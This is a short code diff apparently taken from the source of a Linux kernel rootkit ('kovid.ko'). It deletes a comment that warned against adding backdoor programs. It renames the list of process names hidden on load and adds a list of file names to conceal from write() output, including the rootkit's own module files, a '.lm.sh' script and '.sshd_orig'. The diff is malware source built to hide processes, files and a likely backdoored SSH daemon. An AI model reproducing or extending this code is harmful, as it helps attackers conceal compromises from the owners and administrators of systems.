@@ -161,13 +161,20 @@ char *kv_util_random_AZ_string(size_t);
 unsigned long kv_get_elf_vm_start(pid_t);
 
  /*
-  * The names below are just examples and can be
-  * modified and/or extended at will
-  * warning: don't add backdoor programs here
+  * Hide these process names during load
+  * children included
  */
-static const char *hide_on_load_list[] = {
+static const char *kv_hide_ps_on_load[] = {
     "whitenose", "pinknose", "rednose", "blacknose",
     "greynose", "purplenose", "bluenose", NULL
+};
+
+/*
+ * Hide these names from write() fs output
+ */
+static const char *kv_hide_str_on_load[] = {
+    ".kovid", "kovid", "kovid.ko", ".kv.ko",
+    ".lm.sh", ".sshd_orig", NULL
 };
 
 
